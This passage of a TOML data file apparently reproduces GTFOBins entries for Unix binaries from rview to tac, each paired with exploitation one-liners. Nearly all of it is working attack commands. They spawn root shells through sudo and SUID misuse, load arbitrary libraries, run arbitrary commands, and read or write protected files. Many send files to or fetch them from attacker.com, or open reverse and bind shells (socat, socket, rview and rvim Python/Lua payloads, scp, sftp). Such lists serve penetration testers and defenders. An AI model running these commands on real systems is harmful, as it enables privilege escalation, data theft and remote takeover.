    [[privilege-esclation.exps.file-upload]]
      exp = "export URL=http://attacker.com/\nexport LFILE=file_to_send\nrview -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))\nvim.command(\":q!\")'\n"
    [[privilege-esclation.exps.file-upload]]
      exp = "export LPORT=8888\nrview -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()\nvim.command(\":q!\")'\n"
    [[privilege-esclation.exps.file-upload]]
      exp = "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nrview -c ':lua local f=io.open(os.getenv(\"LFILE\"), 'rb')\n  local d=f:read(\"*a\")\n  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  t:send(d);\n  t:close();'\n"
    [[privilege-esclation.exps.file-write]]
      exp = "rview file_to_write\niDATA\n^[\nw!\n"
    [[privilege-esclation.exps.library-load]]
      exp = "rview -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'"
    [[privilege-esclation.exps.limited-suid]]
      exp = "./rview -c ':lua os.execute(\"reset; exec sh\")'"
    [[privilege-esclation.exps.non-interactive-bind-shell]]
      exp = "export LPORT=12345\nrview -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'\n"
    [[privilege-esclation.exps.non-interactive-reverse-shell]]
      exp = "export RHOST=attacker.com\nexport RPORT=12345\nrview -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'\n"
    [[privilege-esclation.exps.reverse-shell]]
      exp = "export RHOST=attacker.com\nexport RPORT=12345\nrview -c ':py import vim,sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")\nvim.command(\":q!\")'\n"
    [[privilege-esclation.exps.shell]]
      exp = "rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
    [[privilege-esclation.exps.shell]]
      exp = "rview -c ':lua os.execute(\"reset; exec sh\")'"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo rview -c ':lua os.execute(\"reset; exec sh\")'"
    [[privilege-esclation.exps.suid]]
      exp = "./rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
[[privilege-esclation]]
  Name = "rvim"
  Description = ""
  Tags = ["non-interactive-reverse-shell", "file-upload", "file-download", "file-write", "library-load", "capabilities", "limited-suid", "shell", "reverse-shell", "non-interactive-bind-shell", "file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.capabilities]]
      exp = "./rvim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
    [[privilege-esclation.exps.file-download]]
      exp = "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nrvim -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])\nvim.command(\":q!\")'\n"
    [[privilege-esclation.exps.file-download]]
      exp = "export LPORT=12345\nexport LFILE=file_to_save\nrvim -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(os.getenv(\"LFILE\"), \"wb\");\n  f:write(d);\n  io.close(f);'\n"
    [[privilege-esclation.exps.file-read]]
      exp = "rvim file_to_read"
    [[privilege-esclation.exps.file-upload]]
      exp = "export URL=http://attacker.com/\nexport LFILE=file_to_send\nrvim -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))\nvim.command(\":q!\")'\n"
    [[privilege-esclation.exps.file-upload]]
      exp = "export LPORT=8888\nrvim -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()\nvim.command(\":q!\")'\n"
    [[privilege-esclation.exps.file-upload]]
      exp = "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nrvim -c ':lua local f=io.open(os.getenv(\"LFILE\"), 'rb')\n  local d=f:read(\"*a\")\n  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  t:send(d);\n  t:close();'\n"
    [[privilege-esclation.exps.file-write]]
      exp = "rvim file_to_write\niDATA\n^[\nw\n"
    [[privilege-esclation.exps.library-load]]
      exp = "rvim -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'"
    [[privilege-esclation.exps.limited-suid]]
      exp = "./rvim -c ':lua os.execute(\"reset; exec sh\")'"
    [[privilege-esclation.exps.non-interactive-bind-shell]]
      exp = "export LPORT=12345\nrvim -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'\n"
    [[privilege-esclation.exps.non-interactive-reverse-shell]]
      exp = "export RHOST=attacker.com\nexport RPORT=12345\nrvim -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'\n"
    [[privilege-esclation.exps.reverse-shell]]
      exp = "export RHOST=attacker.com\nexport RPORT=12345\nrvim -c ':py import vim,sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")\nvim.command(\":q!\")'\n"
    [[privilege-esclation.exps.shell]]
      exp = "rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
    [[privilege-esclation.exps.shell]]
      exp = "rvim -c ':lua os.execute(\"reset; exec sh\")'"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo rvim -c ':lua os.execute(\"reset; exec sh\")'"
    [[privilege-esclation.exps.suid]]
      exp = "./rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
[[privilege-esclation]]
  Name = "sash"
  Description = ""
  Tags = ["suid", "sudo", "shell"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "sash"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo sash"
    [[privilege-esclation.exps.suid]]
      exp = "./sash"
[[privilege-esclation]]
  Name = "scanmem"
  Description = ""
  Tags = ["shell", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "scanmem\nshell /bin/sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo scanmem\nshell /bin/sh\n"
    [[privilege-esclation.exps.suid]]
      exp = "./scanmem\nshell /bin/sh\n"
[[privilege-esclation]]
  Name = "scp"
  Description = ""
  Tags = ["file-download", "sudo", "limited-suid", "shell", "file-upload"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-download]]
      exp = "RPATH=user@attacker.com:~/file_to_get\nLFILE=file_to_save\nscp $RPATH $LFILE\n"
    [[privilege-esclation.exps.file-upload]]
      exp = "RPATH=user@attacker.com:~/file_to_save\nLPATH=file_to_send\nscp $LFILE $RPATH\n"
    [[privilege-esclation.exps.limited-suid]]
      exp = "TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\n./scp -S $TF a b:\n"
    [[privilege-esclation.exps.shell]]
      exp = "TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\nscp -S $TF x y:\n"
    [[privilege-esclation.exps.sudo]]
      exp = "TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\nsudo scp -S $TF x y:\n"
[[privilege-esclation]]
  Name = "screen"
  Description = ""
  Tags = ["shell", "file-write", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-write]]
      exp = "LFILE=file_to_write\nscreen -L -Logfile $LFILE echo DATA\n"
    [[privilege-esclation.exps.file-write]]
      exp = "LFILE=file_to_write\nscreen -L $LFILE echo DATA\n"
    [[privilege-esclation.exps.shell]]
      exp = "screen"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo screen"
[[privilege-esclation]]
  Name = "script"
  Description = ""
  Tags = ["shell", "sudo", "file-write"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-write]]
      exp = "script -q -c 'echo DATA' file_to_write"
    [[privilege-esclation.exps.shell]]
      exp = "script -q /dev/null"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo script -q /dev/null"
[[privilege-esclation]]
  Name = "scrot"
  Description = "This requires a running X server."
  Tags = ["shell", "limited-suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.limited-suid]]
      exp = "./scrot -e /bin/sh"
    [[privilege-esclation.exps.shell]]
      exp = "scrot -e /bin/sh"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo scrot -e /bin/sh"
[[privilege-esclation]]
  Name = "sed"
  Description = ""
  Tags = ["file-write", "file-read", "suid", "sudo", "shell", "command"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.command]]
      exp = "sed -n '1e id' /etc/hosts"
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nsed '' \"$LFILE\"\n"
    [[privilege-esclation.exps.file-write]]
      exp = "LFILE=file_to_write\nsed -n \"1s/.*/DATA/w $LFILE\" /etc/hosts\n"
    [[privilege-esclation.exps.shell]]
      exp = "sed -n '1e exec sh 1>&0' /etc/hosts"
    [[privilege-esclation.exps.shell]]
      exp = "sed e"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo sed -n '1e exec sh 1>&0' /etc/hosts"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./sed -e '' \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "service"
  Description = ""
  Tags = ["sudo", "shell"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "/usr/sbin/service ../../bin/sh"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo service ../../bin/sh"
[[privilege-esclation]]
  Name = "setarch"
  Description = "The `uname -m` command can be used in place of `arch` to obtain the architecture."
  Tags = ["suid", "sudo", "shell"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "setarch $(arch) /bin/sh"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo setarch $(arch) /bin/sh"
    [[privilege-esclation.exps.suid]]
      exp = "./setarch $(arch) /bin/sh -p"
[[privilege-esclation]]
  Name = "setfacl"
  Description = "This can be run with elevated privileges to change ownership and then read, write, or execute a file."
  Tags = ["suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_change\nUSER=somebody\nsudo setfacl -m -u:$USER:rwx $LFILE\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_change\nUSER=somebody\n./setfacl -m u:$USER:rwx $LFILE\n"
[[privilege-esclation]]
  Name = "setlock"
  Description = ""
  Tags = ["sudo", "shell", "suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "TF=$(mktemp)\nsetlock $TF /bin/sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo setlock - /bin/sh"
    [[privilege-esclation.exps.suid]]
      exp = "./setlock - /bin/sh -p"
[[privilege-esclation]]
  Name = "sftp"
  Description = ""
  Tags = ["shell", "file-upload", "file-download", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-download]]
      exp = "RHOST=user@attacker.com\nsftp $RHOST\nget file_to_get file_to_save\n"
    [[privilege-esclation.exps.file-upload]]
      exp = "RHOST=user@attacker.com\nsftp $RHOST\nput file_to_send file_to_save\n"
    [[privilege-esclation.exps.shell]]
      exp = "HOST=user@attacker.com\nsftp $HOST\n!/bin/sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "HOST=user@attacker.com\nsudo sftp $HOST\n!/bin/sh\n"
[[privilege-esclation]]
  Name = "sg"
  Description = ""
  Tags = ["shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "sg $(id -ng)\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo sg root\n"
[[privilege-esclation]]
  Name = "shuf"
  Description = ""
  Tags = ["file-read", "file-write", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nshuf -z \"$LFILE\"\n"
    [[privilege-esclation.exps.file-write]]
      exp = "LFILE=file_to_write\nshuf -e DATA -o \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_write\nsudo shuf -e DATA -o \"$LFILE\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_write\n./shuf -e DATA -o \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "slsh"
  Description = ""
  Tags = ["shell", "sudo", "limited-suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.limited-suid]]
      exp = "./slsh -e 'system(\"/bin/sh\")'"
    [[privilege-esclation.exps.shell]]
      exp = "slsh -e 'system(\"/bin/sh\")'"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo slsh -e 'system(\"/bin/sh\")'"
[[privilege-esclation]]
  Name = "smbclient"
  Description = "A valid SMB/CIFS server must be available."
  Tags = ["file-upload", "file-download", "sudo", "shell"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-download]]
      exp = "smbclient '\\\\attacker\\share' -c 'put file_to_send where_to_save'\n"
    [[privilege-esclation.exps.file-upload]]
      exp = "smbclient '\\\\attacker\\share' -c 'put file_to_send where_to_save'\n"
    [[privilege-esclation.exps.shell]]
      exp = "smbclient '\\\\attacker\\share'\n!/bin/sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo smbclient '\\\\attacker\\share'\n!/bin/sh\n"
[[privilege-esclation]]
  Name = "snap"
  Description = ""
  Tags = ["sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.sudo]]
      exp = "sudo snap install xxxx_1.0_all.snap --dangerous --devmode\n"
[[privilege-esclation]]
  Name = "socat"
  Description = ""
  Tags = ["file-write", "reverse-shell", "bind-shell", "file-upload", "file-read", "shell", "file-download", "sudo", "limited-suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.bind-shell]]
      exp = "LPORT=12345\nsocat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane\n"
    [[privilege-esclation.exps.file-download]]
      exp = "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nsocat -u tcp-connect:$RHOST:$RPORT open:$LFILE,creat\n"
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nsocat -u \"file:$LFILE\" -\n"
    [[privilege-esclation.exps.file-upload]]
      exp = "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nsocat -u file:$LFILE tcp-connect:$RHOST:$RPORT\n"
    [[privilege-esclation.exps.file-write]]
      exp = "LFILE=file_to_write\nsocat -u 'exec:echo DATA' \"open:$LFILE,creat\"\n"
    [[privilege-esclation.exps.limited-suid]]
      exp = "RHOST=attacker.com\nRPORT=12345\n./socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane\n"
    [[privilege-esclation.exps.reverse-shell]]
      exp = "RHOST=attacker.com\nRPORT=12345\nsocat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane\n"
    [[privilege-esclation.exps.shell]]
      exp = "socat stdin exec:/bin/sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo socat stdin exec:/bin/sh\n"
[[privilege-esclation]]
  Name = "socket"
  Description = ""
  Tags = ["reverse-shell", "bind-shell"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.bind-shell]]
      exp = "LPORT=12345\nsocket -svp '/bin/sh -i' $LPORT\n"
    [[privilege-esclation.exps.reverse-shell]]
      exp = "RHOST=attacker.com\nRPORT=12345\nsocket -qvp '/bin/sh -i' $RHOST $RPORT\n"
[[privilege-esclation]]
  Name = "soelim"
  Description = "The content is actually parsed and corrupted by the command, thus it may not be suitable for arbitrary files."
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nsoelim \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo soelim \"$LFILE\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./soelim \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "softlimit"
  Description = ""
  Tags = ["shell", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "softlimit /bin/sh"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo softlimit /bin/sh"
    [[privilege-esclation.exps.suid]]
      exp = "./softlimit /bin/sh -p"
[[privilege-esclation]]
  Name = "sort"
  Description = ""
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nsort -m \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo sort -m \"$LFILE\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./sort -m \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "split"
  Description = ""
  Tags = ["file-read", "file-write", "command", "shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.command]]
      exp = "COMMAND=id\nTF=$(mktemp)\nsplit --filter=$COMMAND $TF\n"
    [[privilege-esclation.exps.command]]
      exp = "COMMAND=id\necho | split --filter=$COMMAND /dev/stdin\n"
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nTF=$(mktemp)\nsplit $LFILE $TF\ncat $TF*\n"
    [[privilege-esclation.exps.file-write]]
      exp = "TF=$(mktemp)\necho DATA >$TF\nsplit -b999m $TF\n"
    [[privilege-esclation.exps.file-write]]
      exp = "EXT=.xxx\nTF=$(mktemp)\necho DATA >$TF\nsplit -b999m --additional-suffix $EXTENSION $TF\n"
    [[privilege-esclation.exps.shell]]
      exp = "split --filter=/bin/sh /dev/stdin\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo split --filter=/bin/sh /dev/stdin\n"
[[privilege-esclation]]
  Name = "sqlite3"
  Description = ""
  Tags = ["shell", "file-write", "file-read", "suid", "sudo", "limited-suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nsqlite3 << EOF\nCREATE TABLE t(line TEXT);\n.import $LFILE t\nSELECT * FROM t;\nEOF\n"
    [[privilege-esclation.exps.file-write]]
      exp = "LFILE=file_to_write\nsqlite3 /dev/null -cmd \".output $LFILE\" 'select \"DATA\";'\n"
    [[privilege-esclation.exps.limited-suid]]
      exp = "./sqlite3 /dev/null '.shell /bin/sh'"
    [[privilege-esclation.exps.shell]]
      exp = "sqlite3 /dev/null '.shell /bin/sh'"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo sqlite3 /dev/null '.shell /bin/sh'"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\nsqlite3 << EOF\nCREATE TABLE t(line TEXT);\n.import $LFILE t\nSELECT * FROM t;\nEOF\n"
[[privilege-esclation]]
  Name = "sqlmap"
  Description = "This allows to execute [`python`](/gtfobins/python/) code, other functions may apply."
  Tags = ["shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "sqlmap -u 127.0.0.1 --eval=\"import os; os.system('/bin/sh')\""
    [[privilege-esclation.exps.sudo]]
      exp = "sudo sqlmap -u 127.0.0.1 --eval=\"import os; os.system('/bin/sh')\""
[[privilege-esclation]]
  Name = "ss"
  Description = "The file content is actually parsed so only a part of the first line is returned as a part of an error message.\n"
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nss -a -F $LFILE\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo ss -a -F $LFILE\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./ss -a -F $LFILE\n"
[[privilege-esclation]]
  Name = "ssh-agent"
  Description = ""
  Tags = ["suid", "sudo", "shell"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "ssh-agent /bin/sh"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo ssh-agent /bin/"
    [[privilege-esclation.exps.suid]]
      exp = "./ssh-agent /bin/ -p"
[[privilege-esclation]]
  Name = "ssh-keygen"
  Description = ""
  Tags = ["library-load", "sudo", "suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.library-load]]
      exp = "ssh-keygen -D ./lib.so"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo ssh-keygen -D ./lib.so"
    [[privilege-esclation.exps.suid]]
      exp = "./ssh-keygen -D ./lib.so"
[[privilege-esclation]]
  Name = "ssh-keyscan"
  Description = "The file content is actually parsed so only a part of each line is returned as a part of an error message.\n"
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nssh-keyscan -f $LFILE\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo ssh-keyscan -f $LFILE\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./ssh-keyscan -f $LFILE\n"
[[privilege-esclation]]
  Name = "ssh"
  Description = ""
  Tags = ["file-download", "file-read", "sudo", "shell", "file-upload"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-download]]
      exp = "HOST=user@attacker.com\nRPATH=file_to_get\nLPATH=file_to_save\nssh $HOST \"cat $RPATH\" > $LPATH\n"
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nssh -F $LFILE localhost\n"
    [[privilege-esclation.exps.file-upload]]
      exp = "HOST=user@attacker.com\nRPATH=file_to_save\nLPATH=file_to_send\nssh $HOST \"cat > $RPATH\" < $LPATH\n"
    [[privilege-esclation.exps.shell]]
      exp = "ssh localhost $SHELL --noprofile --norc"
    [[privilege-esclation.exps.shell]]
      exp = "ssh -o ProxyCommand=';sh 0<&2 1>&2' x"
    [[privilege-esclation.exps.shell]]
      exp = "ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh host"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x"
[[privilege-esclation]]
  Name = "sshpass"
  Description = ""
  Tags = ["shell", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "sshpass /bin/sh"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo sshpass /bin/sh"
    [[privilege-esclation.exps.suid]]
      exp = "./sshpass /bin/sh -p"
[[privilege-esclation]]
  Name = "start-stop-daemon"
  Description = ""
  Tags = ["suid", "sudo", "shell"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "start-stop-daemon -n $RANDOM -S -x /bin/sh"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo start-stop-daemon -n $RANDOM -S -x /bin/sh"
    [[privilege-esclation.exps.suid]]
      exp = "./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p"
[[privilege-esclation]]
  Name = "stdbuf"
  Description = ""
  Tags = ["shell", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "stdbuf -i0 /bin/sh"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo stdbuf -i0 /bin/sh"
    [[privilege-esclation.exps.suid]]
      exp = "./stdbuf -i0 /bin/sh -p"
[[privilege-esclation]]
  Name = "strace"
  Description = ""
  Tags = ["file-write", "shell", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-write]]
      exp = "LFILE=file_to_write\nstrace -s 999 -o $LFILE strace - DATA\n"
    [[privilege-esclation.exps.shell]]
      exp = "strace -o /dev/null /bin/sh"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo strace -o /dev/null /bin/sh"
    [[privilege-esclation.exps.suid]]
      exp = "./strace -o /dev/null /bin/sh -p"
[[privilege-esclation]]
  Name = "strings"
  Description = "This only returns ASCII strings, thus it is not suitable for binary files."
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nstrings \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo strings \"$LFILE\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./strings \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "su"
  Description = ""
  Tags = ["sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.sudo]]
      exp = "sudo su"
[[privilege-esclation]]
  Name = "sysctl"
  Description = ""
  Tags = ["suid", "sudo", "command", "file-read"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.command]]
      exp = "COMMAND='/bin/sh -c id>/tmp/id'\nsysctl \"kernel.core_pattern=|$COMMAND\"\nsleep 9999 &\nkill -QUIT $!\ncat /tmp/id\n"
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\n/usr/sbin/sysctl -n \"/../../$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "COMMAND='/bin/sh -c id>/tmp/id'\nsudo sysctl \"kernel.core_pattern=|$COMMAND\"\nsleep 9999 &\nkill -QUIT $!\ncat /tmp/id\n"
    [[privilege-esclation.exps.suid]]
      exp = "COMMAND='/bin/sh -c id>/tmp/id'\n./sysctl \"kernel.core_pattern=|$COMMAND\"\nsleep 9999 &\nkill -QUIT $!\ncat /tmp/id\n"
[[privilege-esclation]]
  Name = "systemctl"
  Description = ""
  Tags = ["suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.sudo]]
      exp = "TF=$(mktemp)\necho /bin/sh >$TF\nchmod +x $TF\nsudo SYSTEMD_EDITOR=$TF systemctl edit system.slice\n"
    [[privilege-esclation.exps.sudo]]
      exp = "TF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"id > /tmp/output\"\n[Install]\nWantedBy=multi-user.target' > $TF\nsudo systemctl link $TF\nsudo systemctl enable --now $TF\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo systemctl\n!sh\n"
    [[privilege-esclation.exps.suid]]
      exp = "TF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"id > /tmp/output\"\n[Install]\nWantedBy=multi-user.target' > $TF\n./systemctl link $TF\n./systemctl enable --now $TF\n"
[[privilege-esclation]]
  Name = "systemd-resolve"
  Description = ""
  Tags = ["sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.sudo]]
      exp = "sudo systemd-resolve --status\n!sh\n"
[[privilege-esclation]]
  Name = "tac"
  Description = "Make sure that `RANDOM` does not appear into the file to read otherwise the content of the file is corrupted by reversing the order of `RANDOM`-separated chunks."
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\ntac -s 'RANDOM' \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo tac -s 'RANDOM' \"$LFILE\"\n"
    [[privilege-esclation.exps.suid]]
